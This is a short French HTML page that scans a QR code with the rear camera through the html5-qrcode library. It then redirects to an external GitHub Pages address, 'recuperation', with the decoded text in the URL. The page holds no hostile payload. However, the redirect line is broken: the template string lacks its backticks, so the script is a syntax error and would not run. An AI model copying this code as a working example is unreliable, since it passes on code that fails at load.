<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Scan QR Code</title>
  <script src="https://unpkg.com/html5-qrcode"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background-color: #f0f0f0;
      padding: 20px;
    }
    #reader {
      width: 100%;
      max-width: 400px;
      margin: auto;
    }
    #status {
      font-size: 18px;
      margin-top: 20px;
      color: green;
    }
  </style>
</head>
<body>
  <h2>Scan QR Code</h2>
  <div id="reader"></div>
  <div id="status"></div>

  <script>
    const html5QrCode = new Html5Qrcode("reader");

    const config = {
      fps: 10,
      qrbox: 250,
      facingMode: { exact: "environment" } // Caméra arrière
    };

    function onScanSuccess(decodedText, decodedResult) {
      document.getElementById("status").innerText = "Donnée mise à jour...";
      html5QrCode.stop().then(() => {
        setTimeout(() => {
          const encoded = encodeURIComponent(decodedText);
          window.location.href = https://nohoarii96.github.io/recuperation/?qr=${encoded};
        }, 3000); // 3 secondes d’attente
      }).catch(err => console.error("Erreur arrêt caméra :", err));
    }

    // Démarrer le scan immédiatement
    Html5Qrcode.getCameras().then(devices => {
      if (devices && devices.length) {
        const rearCamera = devices.find(device => device.label.toLowerCase().includes("back")) || devices[0];
        html5QrCode.start(
          rearCamera.id,
          config,
          onScanSuccess,
          error => { /* Ignorer les erreurs de scan */ }
        ).catch(err => console.error("Erreur lancement caméra :", err));
      }
    }).catch(err => console.error("Erreur détection caméra :", err));
  </script>
</body>
</html>
